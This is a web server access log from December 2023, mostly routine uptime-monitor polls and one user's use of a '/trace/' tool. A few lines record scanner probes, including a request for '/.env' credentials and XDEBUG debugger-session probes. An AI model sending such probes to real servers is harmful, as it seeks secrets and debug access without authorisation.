167.71.120.76 - - [16/Dec/2023:16:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2804 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2805 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2806 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2807 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2808 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2809 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2810 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2811 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2812 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2813 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2814 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2815 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2816 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2817 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2818 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2819 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2820 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2821 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2822 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2823 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2824 "www@docker" "http://172.29.0.8:80" 0ms
172.58.251.142 - - [16/Dec/2023:16:45:15 +0000] "GET /trace/ HTTP/2.0" 200 4054 "-" "-" 2825 "livetrace@docker" "http://172.29.0.3:80" 5050ms
172.58.251.142 - - [16/Dec/2023:16:45:20 +0000] "GET /favicon.ico HTTP/2.0" 404 153 "-" "-" 2826 "www@docker" "http://172.29.0.8:80" 14ms
159.203.109.206 - - [16/Dec/2023:16:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2827 "www@docker" "http://172.29.0.8:80" 0ms
172.58.251.142 - - [16/Dec/2023:16:45:26 +0000] "GET /trace/ HTTP/2.0" 200 4054 "-" "-" 2828 "livetrace@docker" "http://172.29.0.3:80" 5006ms
172.58.251.142 - - [16/Dec/2023:16:45:32 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 200 1387 "-" "-" 2829 "livetrace@docker" "http://172.29.0.3:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2830 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2831 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2832 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2833 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2834 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2835 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2836 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2837 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2838 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2839 "www@docker" "http://172.29.0.8:80" 0ms
185.224.128.191 - - [16/Dec/2023:16:50:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2840 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:16:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2841 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2842 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2843 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2844 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2845 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2846 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2847 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2848 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2849 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2850 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2851 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2852 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2853 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2854 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2855 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2856 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2857 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2858 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2859 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2860 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2861 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2862 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:17:01:31 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2863 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:17:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2864 "www@docker" "http://172.29.0.8:80" 0ms
54.37.79.75 - - [16/Dec/2023:17:02:19 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2865 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [16/Dec/2023:17:02:19 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2866 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:17:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2867 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2868 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2869 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2870 "www@docker" "http://172.29.0.8:80" 0ms
90.151.171.108 - - [16/Dec/2023:17:03:37 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 2871 "web-to-websecure@internal" "-" 0ms
90.151.171.108 - - [16/Dec/2023:17:03:54 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 2872 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:17:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2873 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2874 "www@docker" "http://172.29.0.8:80" 1ms
83.97.73.87 - - [16/Dec/2023:17:04:47 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 2875 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:17:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2876 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2877 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2878 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2879 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2880 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2881 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2882 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2883 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2884 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2885 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2886 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2887 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2888 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2889 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2890 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2891 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2892 "www@docker" "http://172.29.0.8:80" 0ms
87.236.176.126 - - [16/Dec/2023:17:13:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2893 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:17:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2894 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2895 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2896 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2897 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2898 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:17:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2899 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2900 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2901 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2902 "www@docker" "http://172.29.0.8:80" 0ms
94.102.61.88 - - [16/Dec/2023:17:17:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2903 "-" "-" 0ms
83.97.73.87 - - [16/Dec/2023:17:18:11 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 2904 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:17:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2905 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2906 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2907 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2908 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:17:20:11 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2909 "web-to-websecure@internal" "-" 0ms
45.79.149.111 - - [16/Dec/2023:17:20:12 +0000] "GET /IqUM HTTP/1.1" 301 17 "-" "-" 2910 "web-to-websecure@internal" "-" 0ms
45.79.149.111 - - [16/Dec/2023:17:20:12 +0000] "GET /B5rt HTTP/1.1" 301 17 "-" "-" 2911 "web-to-websecure@internal" "-" 0ms
96.126.112.220 - - [16/Dec/2023:17:20:12 +0000] "GET /8Tcm HTTP/1.1" 404 19 "-" "-" 2912 "-" "-" 0ms
96.126.112.220 - - [16/Dec/2023:17:20:13 +0000] "GET /7Xfh HTTP/1.1" 404 19 "-" "-" 2913 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:17:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2914 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2915 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:17:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2916 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2917 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2918 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2919 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2920 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2921 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2922 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2923 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:17:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2924 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2925 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2926 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2927 "www@docker" "http://172.29.0.8:80" 0ms
68.69.186.30 - - [16/Dec/2023:17:26:39 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2928 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:17:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2929 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2930 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:17:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2931 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2932 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2933 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2934 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2935 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2936 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2937 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2938 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2939 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2940 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2941 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2942 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2943 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2944 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2945 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:17:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2946 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2947 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2948 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:17:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2949 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:17:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2950 "www@docker" "http://172.29.0.8:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:44 +0000] "GET /trace/starttrace.php?id=mtp4i0oqn HTTP/2.0" 200 106 "-" "-" 2951 "livetrace@docker" "http://172.29.0.3:80" 35ms
172.58.251.170 - - [16/Dec/2023:17:37:45 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 80 "-" "-" 2952 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:46 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 80 "-" "-" 2953 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:37:47 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 80 "-" "-" 2954 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:48 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 80 "-" "-" 2955 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:49 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 80 "-" "-" 2956 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:50 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 80 "-" "-" 2957 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:51 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 80 "-" "-" 2958 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:52 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 80 "-" "-" 2959 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:53 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 80 "-" "-" 2960 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:37:54 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 80 "-" "-" 2961 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:55 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 147 "-" "-" 2962 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:56 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 147 "-" "-" 2963 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:57 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 147 "-" "-" 2964 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:58 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 147 "-" "-" 2965 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:37:59 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 147 "-" "-" 2966 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:00 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 147 "-" "-" 2967 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:01 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 147 "-" "-" 2968 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:02 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 147 "-" "-" 2969 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:03 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 147 "-" "-" 2970 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:04 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 147 "-" "-" 2971 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:05 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 279 "-" "-" 2972 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:06 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 279 "-" "-" 2973 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:07 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 279 "-" "-" 2974 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:08 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 302 "-" "-" 2975 "livetrace@docker" "http://172.29.0.3:80" 1ms
172.58.251.170 - - [16/Dec/2023:17:38:09 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 302 "-" "-" 2976 "livetrace@docker" "http://172.29.0.3:80" 2ms
172.58.251.170 - - [16/Dec/2023:17:38:10 +0000] "GET /trace/polltrace.php?id=mtp4i0oqn HTTP/2.0" 200 302 "-" "-" 2977 "livetrace@docker" "http://172.29.0.3:80" 1ms
